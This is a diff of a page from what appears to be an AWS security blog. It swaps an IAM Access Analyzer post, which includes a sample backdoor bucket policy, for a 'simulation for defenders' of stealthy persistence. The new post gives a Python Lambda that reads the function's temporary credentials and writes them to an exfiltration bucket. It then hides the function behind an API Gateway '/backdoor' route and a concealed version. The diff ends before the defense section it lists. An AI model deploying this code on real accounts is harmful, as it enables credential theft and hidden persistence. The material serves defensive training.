@@ -12,13 +12,11 @@
         <meta name="author" content="Sergio Jimenez">
       
       
-        <link rel="canonical" href="https://sjimnar.github.io/blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/">
+        <link rel="canonical" href="https://sjimnar.github.io/blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/">
       
       
-        <link rel="prev" href="../defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/">
+        <link rel="prev" href="../../25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/">
       
-      
-        <link rel="next" href="../../27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/">
       
       
       <link rel="icon" href="../../../../../assets/images/favicon.png">
@@ -26,7 +24,7 @@
     
     
       
-        <title>IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets - aws! security blog</title>
+        <title>Stealthy Persistence in AWS - A Practical Simulation for Defenders - aws! security blog</title>
       
     
     
@@ -71,11 +69,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets - aws! security blog" >
+        <meta  property="og:title"  content="Stealthy Persistence in AWS - A Practical Simulation for Defenders - aws! security blog" >
       
         <meta  property="og:description"  content="A blog about AWS security" >
       
-        <meta  property="og:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/s3-iam-access-analyzer.png" >
+        <meta  property="og:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/stealthy-persistence-lambda.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -83,15 +81,15 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://sjimnar.github.io/blog/2025/06/25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/" >
+        <meta  property="og:url"  content="https://sjimnar.github.io/blog/2025/06/27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets - aws! security blog" >
+        <meta  name="twitter:title"  content="Stealthy Persistence in AWS - A Practical Simulation for Defenders - aws! security blog" >
       
         <meta  name="twitter:description"  content="A blog about AWS security" >
       
-        <meta  name="twitter:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/s3-iam-access-analyzer.png" >
+        <meta  name="twitter:image"  content="https://sjimnar.github.io/assets/images/social/blog/posts/stealthy-persistence-lambda.png" >
       
     
     
@@ -114,7 +112,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#why-iam-access-analyzer-is-crucial-for-s3" class="md-skip">
+        <a href="#stealthy-persistence-in-aws-a-practical-simulation-for-defenders" class="md-skip">
           Skip to content
         </a>
       
@@ -149,7 +147,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets
+              Stealthy Persistence in AWS - A Practical Simulation for Defenders
             
           </span>
         </div>
@@ -363,30 +361,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/" class="md-nav__link">
         
   
   
@@ -397,60 +375,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#why-iam-access-analyzer-is-crucial-for-s3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Why IAM Access Analyzer is Crucial for S3
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#how-external-access-detection-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      How External Access Detection Works
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#example-scenario-the-backdoor-policy" class="md-nav__link">
-    <span class="md-ellipsis">
-      Example Scenario: The Backdoor Policy
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#how-to-enable-and-use-iam-access-analyzer" class="md-nav__link">
-    <span class="md-ellipsis">
-      How to Enable and Use IAM Access Analyzer
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -463,7 +387,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/" class="md-nav__link">
+      <a href="../../25/defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/" class="md-nav__link">
         
   
   
@@ -558,38 +482,119 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#why-iam-access-analyzer-is-crucial-for-s3" class="md-nav__link">
+  <a href="#stealthy-persistence-in-aws-a-practical-simulation-for-defenders" class="md-nav__link">
     <span class="md-ellipsis">
-      Why IAM Access Analyzer is Crucial for S3
+      Stealthy Persistence in AWS: A Practical Simulation for Defenders
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Stealthy Persistence in AWS: A Practical Simulation for Defenders">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-technique-in-detail-api-gateway-lambda-for-credential-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Technique in Detail: API Gateway + Lambda for Credential Exfiltration
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#how-external-access-detection-works" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-attack-scenario-step-by-step-simulation" class="md-nav__link">
     <span class="md-ellipsis">
-      How External Access Detection Works
+      Setting Up the Attack Scenario: Step-by-Step Simulation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setting Up the Attack Scenario: Step-by-Step Simulation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-preparing-the-aws-ground" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Preparing the AWS Ground
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#example-scenario-the-backdoor-policy" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#2-the-malicious-lambda-code-and-role" class="md-nav__link">
     <span class="md-ellipsis">
-      Example Scenario: The Backdoor Policy
+      2. The "Malicious" Lambda: Code and Role
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#how-to-enable-and-use-iam-access-analyzer" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#3-the-api-gateway-deception" class="md-nav__link">
     <span class="md-ellipsis">
-      How to Enable and Use IAM Access Analyzer
+      3. The API Gateway Deception
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-the-key-to-stealth-lambda-versions" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. The Key to Stealth: Lambda Versions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-time-to-invoke-the-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Time to Invoke the Backdoor!
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-and-detection-hardening-your-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense and Detection: Hardening Your Environment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense and Detection: Hardening Your Environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#monitoring-and-detection-red-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      Monitoring and Detection (Red Flags)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#prevention-blue-fortress" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prevention (Blue Fortress)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -630,7 +635,7 @@
                     <li class="md-nav__item">
                       <div class="md-nav__link">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
-                        <time datetime="2025-06-25 00:00:00+00:00" class="md-ellipsis">June 25, 2025</time>
+                        <time datetime="2025-06-27 00:00:00+00:00" class="md-ellipsis">June 27, 2025</time>
                       </div>
                     </li>
                     
@@ -642,7 +647,7 @@
                           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
                           <span class="md-ellipsis">
                             
-                              3 min read
+                              5 min read
                             
                           </span>
                         </div>
@@ -669,56 +674,134 @@
   
 
 
-  <h1>IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets</h1>
+  <h1>Stealthy Persistence in AWS - A Practical Simulation for Defenders</h1>
 
-<p align="center">
-  <img src="/../assets/images/iam-access-analyzer.png" alt="IAM Access Analyzer" width="700"/>
-</p>
-
-<p>In the vast and ever-expanding AWS ecosystem, permission management is crucial. A simple misconfiguration in an S3 bucket policy can expose sensitive data, opening a backdoor for attackers. This is where IAM Access Analyzer steps in, acting as an unyielding sentinel to protect your resources by detecting unwanted external access.</p>
-<h2 id="why-iam-access-analyzer-is-crucial-for-s3">Why IAM Access Analyzer is Crucial for S3</h2>
-<p>Imagine you've set up an S3 bucket to store critical information. Unbeknownst to you, a poorly configured policy could grant access to an external AWS account or, worse yet, make the bucket publicly accessible. While GuardDuty excels at detecting attack patterns and anomalous activities, and CloudTrail logs all actions, IAM Access Analyzer specializes in the proactive detection of risky policy configurations.</p>
-<p>For instance, GuardDuty might not alert you about a policy granting access to a specific AWS account (as it's not "anonymous" or "public" access in the strict sense that GuardDuty looks for with certain detections). However, Access Analyzer will. Its primary goal is to identify resources accessible from outside your "zone of trust," which includes AWS accounts external to your organization.</p>
-<h2 id="how-external-access-detection-works">How External Access Detection Works</h2>
-<p>IAM Access Analyzer uses logical reasoning to analyze the policies of your resources, including S3 buckets. When you enable it in a region, you define your account or organization as your "zone of trust." It then evaluates all resource policies, searching for any statement that grants permissions to entities outside that zone of trust.</p>
-<p>When IAM Access Analyzer detects a policy that allows an external entity to perform actions on your S3 buckets, it generates a finding. These findings alert you to potential access and provide details like:</p>
+<h2 id="stealthy-persistence-in-aws-a-practical-simulation-for-defenders">Stealthy Persistence in AWS: A Practical Simulation for Defenders</h2>
+<p>In the world of cloud cybersecurity, attackers are always innovating. As defenders, it's crucial not only to understand attack techniques but also to <strong>simulate them to strengthen our own defenses</strong>. Recently, an analysis from Datadog and insights from a security analyst shed light on a particularly cunning persistence technique in AWS: the use of <strong>API Gateway and Lambda Functions for credential exfiltration</strong>, with a "twist" that makes it even harder to detect.</p>
+<p>This article breaks down how an attacker might implement this technique and, more importantly, <strong>how we can simulate it in our own environment</strong> to fine-tune our detection and prevention capabilities.</p>
+<hr />
+<h3 id="the-technique-in-detail-api-gateway-lambda-for-credential-exfiltration">The Technique in Detail: API Gateway + Lambda for Credential Exfiltration</h3>
+<p>Datadog's original idea involved a compromised Lambda creating new IAM users for persistence. However, the "twist" that interests us is the <strong>exfiltration of credentials from the Lambda's own execution environment (<code>/proc/self/environ</code>)</strong>. This is stealthier because an attacker can use these exfiltrated credentials to operate from their own infrastructure, avoiding detections associated with creating new users (a highly monitored API call).</p>
+<p>Persistence is achieved by linking this "malicious" Lambda to an <strong>API Gateway</strong>, creating a web entry point that the attacker can invoke at will. The subtlety is amplified by <strong>Lambda versioning</strong>: an attacker could deploy a "benign" version of the function as <code>$LATEST</code> (the one administrators typically check), while the "backdoored" version (with the exfiltration code) is explicitly invoked by its version number, thus remaining hidden from superficial inspections.</p>
+<hr />
+<h3 id="setting-up-the-attack-scenario-step-by-step-simulation">Setting Up the Attack Scenario: Step-by-Step Simulation</h3>
+<p>To understand and defend ourselves, we'll replicate this technique in a controlled AWS environment.</p>
+<h4 id="1-preparing-the-aws-ground">1. Preparing the AWS Ground</h4>
+<p>Before we start, security is key. Don't use your <code>root</code> account or an administrator user.</p>
 <ul>
-<li><strong>Finding type</strong>: For example, public access or cross-account access.</li>
-<li><strong>Affected resource</strong>: The S3 bucket's ARN.</li>
-<li><strong>Allowed action</strong>: The S3 operations the external entity can perform (e.g., <code>s3:GetObject</code>, <code>s3:ListBucket</code>).</li>
-<li><strong>External principal</strong>: The identity (an AWS account, an IAM user, a role, etc.) that has access.</li>
+<li><strong>Test IAM User:</strong> Create an IAM user with the minimum necessary permissions to <strong>create Lambda functions, API Gateways, and IAM roles</strong>. This simulates an initial compromise with limited privileges.</li>
+<li><strong>S3 Bucket for the "Catch":</strong> You'll need an <strong>S3 bucket</strong> where the "malicious" Lambda will deposit the exfiltrated credentials. Ensure the bucket policy only allows writes from the IAM role your Lambda will assume.</li>
 </ul>
-<p>This is incredibly valuable because it lets you identify and remediate security configurations before they can be exploited.</p>
-<h2 id="example-scenario-the-backdoor-policy">Example Scenario: The Backdoor Policy</h2>
-<p>Consider the following example of an S3 bucket policy that could be used as a "backdoor" to exfiltrate data:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">{</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nt">&quot;Version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2012-10-17&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">&quot;Statement&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">        </span><span class="p">{</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">            </span><span class="nt">&quot;Effect&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Allow&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">            </span><span class="nt">&quot;Principal&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">                </span><span class="nt">&quot;AWS&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:iam::193672423079:root&quot;</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">            </span><span class="p">},</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">            </span><span class="nt">&quot;Action&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">                </span><span class="s2">&quot;s3:GetObject&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">                </span><span class="s2">&quot;s3:GetBucketLocation&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">                </span><span class="s2">&quot;s3:ListBucket&quot;</span>
-<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">            </span><span class="p">],</span>
-<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">            </span><span class="nt">&quot;Resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">                </span><span class="s2">&quot;arn:aws:s3:::my-secret-bucket/*&quot;</span><span class="p">,</span>
-<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">                </span><span class="s2">&quot;arn:aws:s3:::my-secret-bucket&quot;</span>
-<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="w">            </span><span class="p">]</span>
-<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">        </span><span class="p">}</span>
-<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="w">    </span><span class="p">]</span>
-<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="p">}</span>
+<h4 id="2-the-malicious-lambda-code-and-role">2. The "Malicious" Lambda: Code and Role</h4>
+<p>This is the heart of our simulated attack. This function will read environment variables, which in Lambda include temporary credentials.</p>
+<ul>
+<li>
+<p><strong>Lambda Python Code:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">boto3</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="k">def</span><span class="w"> </span><span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>        <span class="c1"># Read environment variables, which in Lambda include temporary credentials</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>        <span class="n">environ_data</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span> <span class="c1"># os.environ is already a dict, no need to read from /proc/self/environ directly here for this purpose.</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>        <span class="c1"># Extract specific credentials (if they exist)</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>        <span class="n">aws_access_key_id</span> <span class="o">=</span> <span class="n">environ_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;AWS_ACCESS_KEY_ID&#39;</span><span class="p">,</span> <span class="s1">&#39;N/A&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>        <span class="n">aws_secret_access_key</span> <span class="o">=</span> <span class="n">environ_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;AWS_SECRET_ACCESS_KEY&#39;</span><span class="p">,</span> <span class="s1">&#39;N/A&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>        <span class="n">aws_session_token</span> <span class="o">=</span> <span class="n">environ_data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;AWS_SESSION_TOKEN&#39;</span><span class="p">,</span> <span class="s1">&#39;N/A&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>        <span class="n">exfiltrated_data</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>            <span class="s2">&quot;lambda_name&quot;</span><span class="p">:</span> <span class="n">context</span><span class="o">.</span><span class="n">function_name</span><span class="p">,</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>            <span class="s2">&quot;aws_access_key_id&quot;</span><span class="p">:</span> <span class="n">aws_access_key_id</span><span class="p">,</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>            <span class="s2">&quot;aws_secret_access_key&quot;</span><span class="p">:</span> <span class="n">aws_secret_access_key</span><span class="p">,</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>            <span class="s2">&quot;aws_session_token&quot;</span><span class="p">:</span> <span class="n">aws_session_token</span><span class="p">,</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>            <span class="s2">&quot;full_environ&quot;</span><span class="p">:</span> <span class="nb">dict</span><span class="p">(</span><span class="n">environ_data</span><span class="p">)</span> <span class="c1"># Convert to dict for JSON serialization</span>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>        <span class="p">}</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>        <span class="c1"># Send data to S3</span>
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>        <span class="n">s3_bucket_name</span> <span class="o">=</span> <span class="s2">&quot;your-exfiltration-bucket&quot;</span> <span class="c1"># IMPORTANT: Change this to your bucket name!</span>
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>        <span class="n">s3_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;exfiltrated-creds/</span><span class="si">{</span><span class="n">context</span><span class="o">.</span><span class="n">aws_request_id</span><span class="si">}</span><span class="s2">.json&quot;</span>
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>        <span class="n">s3_client</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s1">&#39;s3&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>        <span class="n">s3_client</span><span class="o">.</span><span class="n">put_object</span><span class="p">(</span>
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>            <span class="n">Bucket</span><span class="o">=</span><span class="n">s3_bucket_name</span><span class="p">,</span>
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>            <span class="n">Key</span><span class="o">=</span><span class="n">s3_key</span><span class="p">,</span>
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>            <span class="n">Body</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exfiltrated_data</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>        <span class="p">)</span>
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Credentials exfiltrated and saved to s3://</span><span class="si">{</span><span class="n">s3_bucket_name</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">s3_key</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>        <span class="k">return</span> <span class="p">{</span>
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>            <span class="s1">&#39;statusCode&#39;</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>            <span class="s1">&#39;body&#39;</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="s1">&#39;Data exfiltrated successfully!&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>        <span class="p">}</span>
+<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error during exfiltration: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>        <span class="k">return</span> <span class="p">{</span>
+<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>            <span class="s1">&#39;statusCode&#39;</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
+<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>            <span class="s1">&#39;body&#39;</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Error during exfiltration: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>        <span class="p">}</span>
 </code></pre></div>
-<p>This policy allows the root AWS account with ID 193672423079 to access <code>my-secret-bucket</code>. If this account isn't part of your organization, IAM Access Analyzer will generate a finding, as it will detect this cross-account access as a potential vulnerability. It will notify you that your bucket has a policy allowing an external entity to access its content, enabling you to take immediate action.</p>
-<h2 id="how-to-enable-and-use-iam-access-analyzer">How to Enable and Use IAM Access Analyzer</h2>
+</li>
+<li>
+<p><strong>Lambda Execution Role (IAM Role):</strong> This role must have permissions for:</p>
 <ul>
-<li><strong>Enablement</strong>: Go to the AWS IAM console, navigate to Access Analyzer, and enable it for the region where your S3 buckets are located. You can choose to analyze your current account or your entire AWS organization.</li>
-<li><strong>Finding Review</strong>: Once enabled, Access Analyzer will begin scanning your resources. Findings will appear in the Access Analyzer dashboard. Review them regularly.</li>
-<li><strong>Action</strong>: For each finding, determine if the access is intended and secure. If not, modify the bucket policy to revoke the unwanted access. IAM Access Analyzer even helps you generate a secure policy to fix the issue.</li>
+<li><code>lambda:InvokeFunction</code></li>
+<li><code>s3:PutObject</code> in <em>your</em> exfiltration bucket.</li>
+<li>Basic <strong>CloudWatch Logs</strong> permissions (<code>logs:CreateLogGroup</code>, <code>logs:CreateLogStream</code>, <code>logs:PutLogEvents</code>).</li>
 </ul>
+</li>
+</ul>
+<h4 id="3-the-api-gateway-deception">3. The API Gateway Deception</h4>
+<p>The API Gateway is the public facade the attacker will use.</p>
+<ul>
+<li><strong>Create HTTP API:</strong> In the API Gateway console, create a simple <strong>HTTP API</strong>.</li>
+<li><strong>Resource and Method:</strong> Define a resource (e.g., <code>/backdoor</code>) and an HTTP method (e.g., <code>GET</code>).</li>
+<li><strong>Lambda Integration:</strong> Connect this method to your Lambda function. Ensure API Gateway has the permissions to invoke it.</li>
+</ul>
+<h4 id="4-the-key-to-stealth-lambda-versions">4. The Key to Stealth: Lambda Versions</h4>
+<p>This is where the attacker's ingenuity comes in.</p>
+<ul>
+<li><strong>"$LATEST" Version (Benign):</strong> Upload a "clean" version of your Lambda that does something innocuous (e.g., "Hello World"). This will be the one pointed to by the <code>$LATEST</code> alias.</li>
+<li><strong>"Backdoored" Version (Malicious):</strong> Now, <strong>update your Lambda's code with the credential exfiltration script</strong>. Publish a <strong>new version</strong> of this function (e.g., <code>v2</code>). The key is that the attacker will explicitly invoke <code>arn:aws:lambda:region:account-id:function:MyFunction:v2</code>, while your security team might only be checking <code>$LATEST</code>.</li>
+</ul>
+<h4 id="5-time-to-invoke-the-backdoor">5. Time to Invoke the Backdoor!</h4>
+<ul>
+<li><strong>"Normal" Invocation:</strong> Access the API Gateway URL without specifying a version. It should execute the <code>$LATEST</code> (benign) version.</li>
+<li><strong>"Malicious" Invocation:</strong> The attacker will invoke the function by specifying the backdoored version in the ARN. For example: <code>arn:aws:lambda:us-east-1:123456789012:function:MyFunction:v2</code>. After execution, you should find a JSON file with the exfiltrated credentials in your S3 bucket.</li>
+</ul>
+<hr />
